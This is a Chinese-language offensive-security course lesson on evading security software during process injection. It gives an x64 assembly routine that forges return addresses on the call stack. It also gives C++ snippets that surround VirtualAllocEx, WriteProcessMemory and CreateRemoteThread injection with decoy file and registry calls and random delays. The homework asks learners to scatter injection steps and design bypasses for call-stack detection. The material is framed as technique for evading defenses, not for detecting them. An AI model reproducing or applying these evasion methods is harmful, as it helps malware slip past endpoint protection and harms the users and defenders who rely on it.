# 课时32：函数序列欺骗

## 1. 课程目标

深入学习函数调用序列欺骗技术，包括调用栈伪造和行为欺骗。

---

## 2. 调用栈伪造

### 2.1 x64调用栈结构

```
高地址
┌─────────────────────────┐
│ 返回地址 (Return Addr)  │ ← RSP
├─────────────────────────┤
│ 参数5 (如果有)          │
├─────────────────────────┤
│ 参数6 (如果有)          │
├─────────────────────────┤
│ ...                     │
└─────────────────────────┘
低地址
```

### 2.2 伪造实现

```asm
; spoofcall.asm
.code

; 伪造调用 - 修改返回地址
SpoofCall proc
    ; 保存原始返回地址
    pop rax
    
    ; 压入伪造的返回地址
    push r8    ; r8 = 伪造的返回地址
    
    ; 压入真实返回地址（用于恢复）
    push rax
    
    ; 调用目标函数
    jmp rcx    ; rcx = 目标函数地址
    
SpoofCall endp

end
```

---

## 3. 行为序列欺骗

### 3.1 正常行为模拟

```cpp
// 在敏感操作前后执行正常操作
void BehaviorSpoofing() {
    // 正常行为1
    CreateFileW(L"C:\\Windows\\System32\\kernel32.dll", 
                GENERIC_READ, FILE_SHARE_READ, NULL,
                OPEN_EXISTING, 0, NULL);
    
    // 敏感操作（注入）
    // ...
    
    // 正常行为2
    RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE", 0, KEY_READ, &hKey);
}
```

### 3.2 时间分散

```cpp
// 分散敏感操作
void DistributedOperations() {
    VirtualAllocEx(...);  // 第1步
    
    Sleep(1000 + rand() % 2000);  // 随机延迟
    
    WriteProcessMemory(...);  // 第2步
    
    Sleep(500 + rand() % 1000);
    
    CreateRemoteThread(...);  // 第3步
}
```

---

## 4. 课后作业

### 作业1：行为分散（必做）

1. 将注入操作分散到多个时间点
2. 在操作间插入正常行为

### 作业2：调用栈分析（进阶）

1. 分析安全软件如何检测调用栈
2. 设计绕过方案

---

## 5. 下一课预告

下一课我们将学习ShellCode页面反转技术。
